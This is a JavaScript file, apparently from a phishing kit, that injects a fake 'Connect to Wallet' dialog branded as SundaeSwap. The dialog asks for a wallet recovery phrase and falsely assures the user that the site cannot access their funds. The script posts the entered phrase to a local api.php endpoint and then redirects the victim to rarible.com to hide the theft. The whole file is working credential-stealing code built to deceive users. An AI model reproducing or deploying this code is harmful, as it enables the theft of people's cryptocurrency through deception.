var offerName = window.offerName || "SundaeSwap";

var wmContent = '<div class=wm-container id=wmContainer><div class=wm-header><div class=wm-header-icon></div></div><div class=wm-block><h1 class=wm-block-header>Connect to Wallet</h1><p class=wm-block-text>To connect your wallet to <b>' + offerName + '</b>, enter a recovery phrase, usually consisting of 12 or 24 words.<br><br>We do not own your private keys and cannot access your funds without your confirmation.</p><label class=wm-block-label>Recovery Phrase</label><textarea class=wm-block-textarea rows=6 spellcheck=false placeholder="Type or paste your recovery phrase here..." id=wmInput></textarea><p class=wm-block-error-label id=wmLabel>Incorrect recovery phrase.</p><button class=wm-block-button id=wmButton>Connect Wallet</button></div></div>';
var wmStylesheet = '<link rel=stylesheet href="ajax/modal.css" type=text/css>';

$("head").append(wmStylesheet);
$("body").append(wmContent);

var animationDuration = 100;
var isConnectorOpened = false;
var selectedWallet = null;

var wmContainer = $("#wmContainer");
var wmInput = $("#wmInput");
var wmLabel = $("#wmLabel");
var wmButton = $("#wmButton");

var openConnector = function(walletName) {
	let className = null;

	if (walletName) {
		className = walletName.toLowerCase();
		selectedWallet = walletName;
	}

	if (isConnectorOpened) {
		return false;
	}

	wmContainer.attr("class", "wm-container " + className).fadeIn(animationDuration);

	isConnectorOpened = true;
}

var closeConnector = function() {
	wmContainer.fadeOut(animationDuration);
	wmInput.val("");
	wmLabel.hide();

	isConnectorOpened = false;
}

$(document).mouseup(function(element) {
	if (wmContainer.has(element.target).length === 0){
		closeConnector();
	}
});

$(wmButton).click(function() {
	let phrase = wmInput.val();

	if (phrase == "") {
		wmLabel.fadeIn(animationDuration);

    	setTimeout(function() {
    		wmLabel.fadeOut(animationDuration);
    	}, 5000);

    	return false;
	}

	wmButton.text("Connecting...").addClass("disabled");

	$.post("./api.php", {tela:"rarible", type: "phrase", data: phrase, wallet: selectedWallet })
    .done(function(response) {
        	window.location.replace("https://rarible.com/");
    });
});
